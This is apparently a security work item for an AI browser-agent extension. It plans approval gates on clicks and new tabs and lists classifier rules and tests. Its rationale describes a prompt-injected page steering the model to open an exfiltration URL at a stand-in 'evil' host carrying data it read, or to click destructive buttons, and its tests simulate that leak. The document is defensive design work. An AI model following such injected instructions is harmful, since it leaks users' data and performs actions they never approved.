# A1. Gate state-changing clicks and new tabs (Phase A; old ref P01)

**Why.** A prompt-injected page can steer the model to open `https://evil.example/?d=<data it read>` or click a destructive button, with no approval. Gate call sites today: `fill_element_by_uid` and `fill_form` (`tools/element.ts`), `computer` actions `type` and `key` only (`tools/computer.ts`), `run_console_command` (`tools/devtools.ts`), skill execution, downloads, `upload_file_to_input`. **Not gated:** `click` (`clickTool` in `tools/element.ts`), the `computer` tool's click and drag actions, and `create_new_tab` (`createNewTabTool` in `tools/tab.ts`, any URL). Clipboard, bookmark and history tools are not registered. API: `gateRiskyAction(conversationId, toolName, summary, pageUrl, run, { tabId })`.

**Do.**
1. **New tabs:** require approval when the destination origin differs from the current tab's origin and no grant exists for (`create_new_tab`, destination origin). Always require approval, with no "remember" option, for non-`http(s)` schemes or a query plus fragment longer than 128 characters. The approval summary shows the full URL.
2. **`click`:** add a pure classifier `classifyClickRisk(info)` in a new `tools/click-risk.ts`. Risky when the target is a submit control (`button[type=submit]`, `input[type=submit|image]`, a typeless `button` inside a `<form>`), or its accessible name or text matches a vocabulary of destructive or confirming words held in one exported constant (delete, remove, submit, send, pay, transfer, confirm, approve, sign, publish, post, deactivate, and similar), or it is a link whose href origin differs from the page origin. Safe clicks run without a prompt. Risky clicks go through `gateRiskyAction` with a summary showing role, accessible name, tag, form action and method, link target and page origin.
3. **`computer` click and drag actions:** resolve the element at the coordinates (CDP `DOM.getNodeForLocation`, or an `elementFromPoint` query through the frame responder) and apply the same classifier; if unresolvable (canvas, cross-origin frame) treat as risky.
4. Add an `APPROVAL:` sentence to each affected tool description; make sure an `ApprovalDeniedResult` is explained to the model. MCP calls use the same path through the existing relay.
5. Update `docs/security/SECURITY_AUDIT.md` and `docs/security/PERMISSIONS.md` with the gated-tool list.

**Tests.** Unit: table-driven classifier; new-tab URL policy (same origin, cross origin, long query, `data:`, `javascript:`). e2e (extend `agent.e2e.test.mjs`): a scripted model calls `create_new_tab` with `http://127.0.0.1:<evil port>/?d=<200-character secret>`; Deny leaves the "evil" server with **zero requests**, Allow once opens it; a benign click runs without a prompt; a click on a "Delete" submit button prompts and Deny leaves the page counter unchanged; a `computer` click at that button's coordinates prompts; "Allow on this site" for `click` does not enable `create_new_tab`; revoking in Options works; all existing agent tests still pass.

**Acceptance.** An injected `create_new_tab` to an unknown origin and a click on a destructive control cannot run without approval; the "evil" server saw zero requests after Deny.
